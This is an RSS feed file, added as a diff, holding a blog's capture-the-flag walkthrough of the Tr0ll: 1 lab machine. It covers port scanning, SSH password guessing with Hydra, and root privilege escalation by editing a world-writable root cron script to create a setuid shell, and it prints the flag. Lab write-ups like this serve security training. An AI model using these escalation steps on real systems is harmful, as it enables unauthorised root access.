@@ -1,0 +1,305 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Tr0ll on Cheesy Rumbles</title>
+    <link>http://rastamouse.me/categories/tr0ll/</link>
+    <description>Recent content in Tr0ll on Cheesy Rumbles</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 29 Aug 2014 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/categories/tr0ll/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Tr0ll: 1</title>
+      <link>http://rastamouse.me/writeups/2014/tr0ll-1/</link>
+      <pubDate>Fri, 29 Aug 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/tr0ll-1/</guid>
+      <description>
+
+&lt;p&gt;Tr0ll is a boot2root, from &lt;a href=&#34;https://twitter.com/@maleus21&#34;&gt;Maleus&lt;/a&gt;.  It was inspired by the constant trolling of the machines within the OSCP labs.  The goal is simple, gain root and get Proof.txt from the /root directory.  Not for the easily frustrated!  Fair warning, there be trolls ahead!&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:5cf26261215ffd911b8d76378f87ff79&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -A -p- 192.168.127.103
+ 
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxrwxrwx    1 1000     0            8068 Aug 10 00:43 lol.pcap [NSE: writeable]
+22/tcp open  ssh     (protocol 2.0)
+| ssh-hostkey:
+|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
+|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
+|_  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_/secret
+|_http-title: Site doesn&#39;t have a title (text/html).
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Starting from the top, anonymous FTP login is permitted and Nmap has listed the root directory.  I logged in manually and downloaded &lt;code&gt;lol.pcap&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vuln/tr0ll# strings lol.pcap
+[...snip...]
+W150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
+WWell, well, well, aren&#39;t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
+Sucks, you were so close... gotta TRY HARDER!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Having a look around the Apache service reveals a few friendly images.&lt;/p&gt;
+
+&lt;p&gt;
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/troll-1/problem.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/troll-1/umad.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+&lt;/p&gt;
+
+&lt;p&gt;Other tools such as &lt;code&gt;nikto&lt;/code&gt; didn&amp;rsquo;t turn up anything more.  After a little pondering I decided to try &lt;code&gt;sup3rs3cr3tdirlol&lt;/code&gt; as a directory in the URL, and was presented with the following page:&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/troll-1/secretdir.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;I downlaoded &lt;code&gt;roflmao&lt;/code&gt; which turned out to be a binary file, which doesn&amp;rsquo;t appear to do anything more than print the following message:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Find address 0x0856BF to proceed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This has the potential to send you on a massive goose chase, but I was now thinking like a proper troll :p.  Address&amp;hellip; Web address&amp;hellip;?&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/troll-1/0856bf.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;Heh, nice.  These directories contain the following files:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Index of /0x0856BF/good_luck
+[TXT]     which_one_lol.txt     2014-08-09 23:32      109
+ 
+maleus
+ps-aux
+felux
+Eagle11
+genphlux &amp;lt; -- Definitely not this one
+usmc8892
+blawrg
+wytshadow
+vis1t0r
+overflow
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Index of /0x0856BF/this_folder_contains_the_password
+[TXT]     Pass.txt     2014-08-09 23:18      12 
+ 
+Good_job_:)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I took the list in &lt;code&gt;which_one_lol.txt&lt;/code&gt; and used it as potential usernames, and the string &lt;code&gt;Good_job_:)&lt;/code&gt; as a password.  I then ran this through &lt;code&gt;Hydra&lt;/code&gt; to try my luck against SSH.  Unfortunately, it seems that after about 7-8 incorrect logins, the SSH service closes for a while before coming back up.  &lt;code&gt;Hydra&lt;/code&gt; doesn&amp;rsquo;t seem to save its session when this happens, so carrying on after the service comes back up didn&amp;rsquo;t seem possible.  To this end, I just tried the logins manually, since there weren&amp;rsquo;t actually that many.&lt;/p&gt;
+
+&lt;p&gt;However, this password was not valid for any of these accounts :(&lt;/p&gt;
+
+&lt;p&gt;More trolls however - if we recall the name of the directory, &lt;code&gt;this_folder_contains_the_password&lt;/code&gt;.  What&amp;rsquo;s in that folder?  &lt;code&gt;Pass.txt&lt;/code&gt;.  Try the filename as a password&amp;hellip;?&lt;/p&gt;
+
+&lt;p&gt;I finally got a successful login with &lt;code&gt;overflow:Pass.txt&lt;/code&gt;.  Woop.&lt;/p&gt;
+
+&lt;h2 id=&#34;ssh:5cf26261215ffd911b8d76378f87ff79&#34;&gt;SSH&lt;/h2&gt;
+
+&lt;p&gt;I started some basic enumeration until this happened:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Broadcast Message from root@trol                                              
+        (somewhere) at 9:20 ...                                               
+ 
+TIMES UP LOL!                                                                 
+ 
+Connection to 192.168.127.103 closed by remote host.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Oh for God sake, haha - this seems to happen every five minutes or so, but you can just reconnect each time.&lt;/p&gt;
+
+&lt;p&gt;I got a hit whilst searching for world-writeable files.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;find / -perm -0002 -type f -print
+[...snip...]
+/lib/log/cleaner.py
+ 
+-rwxrwxrwx 1 root root 96 Aug 13 00:13 /lib/log/cleaner.py
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A world-writeable script owned by root?  Jackpot (rasta_mouse braces himself for more trolls)&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system(&#39;rm -r /tmp/* &#39;)
+except:
+        sys.exit()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I simply added two new lines to this.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;os.system(&#39;cp /bin/sh /tmp/sh&#39;)
+os.system(&#39;chmod 4777 /tmp/sh&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I waited a few minutes and eventually my shell turned up!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwxrwxrwx 1 root root 112204 Aug 29 10:31 sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# id
+uid=1002(overflow) gid=1002(overflow) euid=0(root) groups=0(root),1002(overflow)
+# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag:5cf26261215ffd911b8d76378f87ff79&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;p&gt;From here, you can cat the flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat root/proof.txt
+Good job, you did it!
+ 
+702a8c18d29c6f3ca0d99ef5712bfbdc
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I also wanted to take a look at the automated processes going on, so here they are.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;*/5 * * * * /usr/bin/python /opt/lmao.py
+*/2 * * * * /usr/bin/python /lib/log/cleaner.py
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+import os
+ 
+os.system(&#39;echo &amp;quot;TIMES UP LOL!&amp;quot;|wall&#39;)
+os.system(&amp;quot;pkill -u &#39;overflow&#39;&amp;quot;)
+sys.exit()
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
